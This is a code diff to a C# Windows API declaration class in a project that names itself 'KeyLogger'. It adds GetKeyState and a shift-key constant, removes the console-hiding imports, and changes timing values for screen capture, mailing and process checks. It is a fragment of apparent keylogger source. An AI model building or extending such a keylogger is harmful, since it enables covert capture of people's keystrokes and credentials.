@@ -6,7 +6,7 @@ using System.Runtime.InteropServices;
 using System.Text;
 using System.Threading.Tasks;
 
-namespace key
+namespace key.KeyLogger
 {
     public class API
     {
@@ -49,11 +49,14 @@ namespace key
         //public static string SaveLogFileText = System.IO.Directory.GetCurrentDirectory() + "/TextLog";
 
         public static int imageCount = 0;
-        public static int captureTime = 100;
+        public static int captureTime = 400;
 
         public static int mailTime = 1000;
         public static int processTime = 1000;
 
+
+        //shift
+        public const int VK_SHIFT_VALUE = 0x10;
 
 
         //paramater
@@ -115,27 +118,6 @@ namespace key
         /// <returns></returns>
         /// 
 
-        //man hinh console
-        //Reference https://docs.microsoft.com/en-us/windows/console/getconsolewindow
-        //<summary>
-        // Retrieves the window handle used by the console associated with the calling process.
-        //</summary>
-        [DllImport("kernel32.dll")]
-        public static extern IntPtr GetConsoleWindow();
-
-
-        //Reference https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-showwindow
-        //<summary>
-        // Sets the specified window's show state.
-        //</summary>
-        [DllImport("user32.dll")]
-        public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
-
-        // hide window code
-        public const int SW_HIDE = 0;
-
-        // show window code
-        public const int SW_SHOW = 5;
 
 
         //Reference https://www.pinvoke.net/default.aspx/user32.getforegroundwindow
@@ -151,5 +133,12 @@ namespace key
         //</summary>
         [DllImport("user32.dll")]
         public static extern Int32 GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);
+
+        //Reference https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getkeystate
+        //<summary>
+        // Retrieves the status of the specified virtual key. Like up, down or toggle (on , off).
+        //</summary>
+        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true, CallingConvention = CallingConvention.Winapi)]
+        public static extern short GetKeyState(int keyCode);
     }
 }
